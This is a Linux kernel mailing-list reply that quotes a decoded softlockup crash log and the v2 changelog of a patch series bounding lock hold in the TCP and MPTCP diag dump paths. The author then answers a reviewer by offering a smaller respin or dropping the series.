+> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+> >    0:   0f b6 03                movzbl (%rbx),%eax
+> >    3:   3c 08                   cmp    $0x8,%al
+> >    5:   76 c2                   jbe    0xffffffffffffffc9
+> >    7:   3c 0b                   cmp    $0xb,%al
+> >    9:   0f 84 76 01 00 00       je     0x185
+> >    f:   77 3a                   ja     0x4b
+> >   11:   3c 09                   cmp    $0x9,%al
+> >   13:   0f                      .byte 0xf
+> >   14:   84                      .byte 0x84
+> >   15:   54                      push   %rsp
+> > [   21.507500] RSP: 0018:ffffbb290036b7a8 EFLAGS: 00000202
+> > [   21.507501] RAX: 0000000000000000 RBX: ffff98bcf7ca2588 RCX: 0000000=
+000000000
+> > [   21.507502] RDX: 0000000000000004 RSI: ffff98bcf7ca0048 RDI: ffff98b=
+cf61c9840
+> > [   21.507502] RBP: 000000000000dabc R08: 0000000000000000 R09: ffff98b=
+cdfb91440
+> > [   21.507502] R10: 0000000000000000 R11: ffff98bcdfb91444 R12: 0000000=
+000000000
+> > [   21.507503] R13: 0000000000002f10 R14: 0000000000000000 R15: 0000000=
+000000002
+> > [   21.507508] FS:  0000000002be8380(0000) GS:ffff98bda3b6e000(0000) kn=
+lGS:0000000000000000
+> > [   21.507509] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+> > [   21.507510] CR2: 00007f62b3bb9000 CR3: 000000000c6b6005 CR4: 0000000=
+000370ef0
+> > [   21.507510] Call Trace:
+> > [   21.507512]  <TASK>
+> > [   21.507512]  ? inet_diag_bc_sk (inet_diag.c:632)
+> > [   21.507514]  tcp_diag_dump (tcp_diag.c:366)
+> > [   21.507524]  ? ___slab_alloc (slub.c:1080 slub.c:4524)
+> > [   21.507526]  ? __kmalloc_node_track_caller_noprof (slub.c:4936 slub.=
+c:5361 slub.c:5497)
+> > [   21.507527]  ? inet_diag_handler_cmd (netlink.h:341 inet_diag.c:983)
+> > [   21.507528]  ? __alloc_skb (skbuff.c:715)
+> > [   21.507531]  ? kmalloc_reserve (skbuff.c:637 (discriminator 1))
+> > [   21.507532]  __inet_diag_dump (inet_diag.c:823)
+> > [   21.507533]  netlink_dump (af_netlink.c:2331)
+> > [   21.507543]  __netlink_dump_start (af_netlink.c:2446)
+> > [   21.507544]  inet_diag_handler_cmd (netlink.h:341 inet_diag.c:983)
+> > [   21.507545]  ? __pfx_inet_diag_dump_start (inet_diag.c:891)
+> > [   21.507546]  ? __pfx_inet_diag_dump (inet_diag.c:928)
+> > [   21.507547]  ? __pfx_inet_diag_dump_done (inet_diag.c:508)
+> > [   21.507548]  sock_diag_rcv_msg (sock_diag.c:248 sock_diag.c:284)
+> > [   21.507550]  ? __pfx_sock_diag_rcv_msg (sock_diag.c:306)
+> > [   21.507551]  netlink_rcv_skb (af_netlink.c:2556)
+> > [   21.507553]  netlink_unicast (af_netlink.c:1319 af_netlink.c:1345)
+> > [   21.507554]  netlink_sendmsg (af_netlink.c:1900)
+> > [   21.507556]  ____sys_sendmsg (socket.c:775 (discriminator 1) socket.=
+c:790 (discriminator 1) socket.c:2684 (discriminator 1))
+> > [   21.507558]  ___sys_sendmsg (socket.c:2738)
+> > [   21.507559]  __sys_sendmsg (socket.c:2770)
+> > [   21.507560]  do_syscall_64 (syscall_64.c:63 syscall_64.c:94)
+> > [   21.507563]  entry_SYSCALL_64_after_hwframe (entry_64.S:121)
+> > [   21.507564] RIP: 0033:0x421964
+> > [   21.507566] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff=
+ eb b5 0f 1f 00 f3 0f 1e fa 80 3d fd 26 09 00 00 74 13 b8 2e 00 00 00 0f 05=
+ <48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
+> > All code
+> > =3D=3D=3D=3D=3D=3D=3D=3D
+> >    0:   c2 c0 ff                ret    $0xffc0
+> >    3:   ff                      (bad)
+> >    4:   ff f7                   push   %rdi
+> >    6:   d8 64 89 02             fsubs  0x2(%rcx,%rcx,4)
+> >    a:   48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
+> >   11:   eb b5                   jmp    0xffffffffffffffc8
+> >   13:   0f 1f 00                nopl   (%rax)
+> >   16:   f3 0f 1e fa             endbr64
+> >   1a:   80 3d fd 26 09 00 00    cmpb   $0x0,0x926fd(%rip)        # 0x92=
+71e
+> >   21:   74 13                   je     0x36
+> >   23:   b8 2e 00 00 00          mov    $0x2e,%eax
+> >   28:   0f 05                   syscall
+> >   2a:*  48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax        =
+ <-- trapping instruction
+> >   30:   77 4c                   ja     0x7e
+> >   32:   c3                      ret
+> >   33:   0f 1f 00                nopl   (%rax)
+> >   36:   55                      push   %rbp
+> >   37:   48 89 e5                mov    %rsp,%rbp
+> >   3a:   48 83 ec 20             sub    $0x20,%rsp
+> >   3e:   89                      .byte 0x89
+> >   3f:   55                      push   %rbp
+> >
+> > Code starting with the faulting instruction
+> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+> >    0:   48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
+> >    6:   77 4c                   ja     0x54
+> >    8:   c3                      ret
+> >    9:   0f 1f 00                nopl   (%rax)
+> >    c:   55                      push   %rbp
+> >    d:   48 89 e5                mov    %rsp,%rbp
+> >   10:   48 83 ec 20             sub    $0x20,%rsp
+> >   14:   89                      .byte 0x89
+> >   15:   55                      push   %rbp
+> > [   21.507567] RSP: 002b:00007ffde1d1cfc8 EFLAGS: 00000202 ORIG_RAX: 00=
+0000000000002e
+> > [   21.507568] RAX: ffffffffffffffda RBX: 0000000002bea910 RCX: 0000000=
+000421964
+> > [   21.507570] RDX: 0000000000000000 RSI: 00007ffde1d1d040 RDI: 0000000=
+000020003
+> > [   21.507571] RBP: 0000000000020003 R08: 0006b49d20000000 R09: 00007f6=
+2b3bb50e8
+> > [   21.507571] R10: 0000000000000004 R11: 0000000000000202 R12: 00007ff=
+de1d1d110
+> > [   21.507571] R13: 0000000000003ffc R14: 0000000000010044 R15: 0000000=
+00000fffc
+> > [   21.507572]  </TASK>
+> > [   21.507573] Kernel panic - not syncing: softlockup: hung tasks
+> > -----END crash log-----
+> >
+> > Best regards,
+> > Zihan Xi
+> >
+> > changes in v2:
+> >   - Rebased onto net commit e2a6641e3bfd (2026-08-27).
+> >   - Corrected the non-listener PoC state mask to TCPF_BOUND_INACTIVE.
+> >   - Added current-bucket cursor validation for TCP listener, bind, and
+> >     ehash paths, and for MPTCP listeners, with safe restart on mismatch=
+.
+> >   - Reject listen/ehash/MPTCP listener cursors unless sk_state still
+> >     matches the table being walked.
+> >   - Count TIME_WAIT bind nodes toward the batch limit and resume them v=
+ia
+> >     tw_tb2 instead of treating them as inet_connection_sock.
+> >   - Kept the listener and bound-only TCP Fixes tags; dropped 7e3aab4a9c=
+d7
+> >     because that commit only converted the existing ehash dump lock typ=
+e.
+> >   - Sorted new TCP dump local declarations reverse xmas tree.
+> >   - Moved INET_DIAG_DUMP_CURSOR_MPTCP_LISTEN into the MPTCP patch.
+> >   - Read icsk_ulp_data with rcu_dereference() after dropping the MPTCP
+> >     listener lock.
+> >   - Refreshed the inline PoC and matching decoded crash log artifacts.
+> >   - Corrected wording and removed duplicate crash-log provenance text.
+> >   - Made PoC defaults match unshare -Urn ./poc (4 listener groups).
+> >   - Clarified crash-log UID 0, cursor fallback restart, and that UDP/RA=
+W
+> >     diag locks are outside this series.
+> >   - v1 Link: https://lore.kernel.org/all/cover.1785307984.git.zihanx@ne=
+busec.ai/
+> >
+> > Zihan Xi (2):
+> >   tcp: diag: bound bucket lock hold in tcp_diag_dump()
+> >   mptcp: diag: bound listener bucket lock hold
+> >
+> >  include/linux/inet_diag.h     |  15 ++
+> >  include/net/inet_hashtables.h |  18 ++
+> >  net/ipv4/inet_diag.c          |  13 ++
+> >  net/ipv4/inet_hashtables.c    |  18 --
+> >  net/ipv4/tcp_diag.c           | 338 +++++++++++++++++++++++++---------
+> >  net/mptcp/mptcp_diag.c        | 124 +++++++++----
+> >  6 files changed, 383 insertions(+), 143 deletions(-)
+> >
+> > --
+> > 2.43.0
+> >
 
+Hi Kuniyuki,
+
+Thanks for the review.
+
+I understand the concern about the added complexity in
+tcp_diag_dump(). I will drop the cursor/batching approach.
+
+If a much smaller change would be useful, I can respin to
+only move the bytecode/filter/fill work out of the bucket
+lock and keep the existing s_num restart. If not, I will
+drop the series.
+
+Thanks,
+Zihan
